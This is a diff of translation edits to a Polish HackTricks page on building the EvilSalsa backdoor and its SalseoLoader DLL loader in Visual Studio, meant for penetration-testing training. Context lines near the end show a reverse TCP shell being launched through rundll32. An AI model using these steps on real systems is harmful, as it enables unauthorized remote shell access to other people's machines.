@@ -6,7 +6,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Wsparcie HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## Kompilacja binarek
+## Kompilacja binariów
 
 Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** oraz **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.
 
@@ -96,7 +96,7 @@ Otwórz projekt SalseoLoader w Visual Studio.
 
 ![](<../.gitbook/assets/image (881).png>)
 
-#### **Szukaj pakietu DllExport (używając zakładki Przeglądaj), a następnie naciśnij Zainstaluj (i zaakceptuj okno popup)**
+#### **Wyszukaj pakiet DllExport (używając zakładki Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj okno popup)**
 
 ![](<../.gitbook/assets/image (100).png>)
 
@@ -114,7 +114,7 @@ Po prostu **zamknij** Visual Studio
 
 Następnie przejdź do swojego **folderu SalseoLoader** i **uruchom DllExport\_Configure.bat**
 
-Wybierz **x64** (jeśli zamierzasz używać go w środowisku x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (w **Namespace for DllExport**) i naciśnij **Zastosuj**
+Wybierz **x64** (jeśli zamierzasz używać go w środowisku x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (w **Przestrzeni nazw dla DllExport**) i naciśnij **Zastosuj**
 
 ![](<../.gitbook/assets/image (882).png>)
 
@@ -130,7 +130,7 @@ Wybierz **Typ wyjścia = Biblioteka klas** (Projekt --> Właściwości SalseoLoa
 
 ![](<../.gitbook/assets/image (847).png>)
 
-Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Budowanie --> Cel platformy = x64)
+Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Cel platformy = x64)
 
 ![](<../.gitbook/assets/image (285).png>)
 
@@ -169,8 +169,8 @@ set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
 {% hint style="success" %}
-Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Ucz się i ćwicz AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
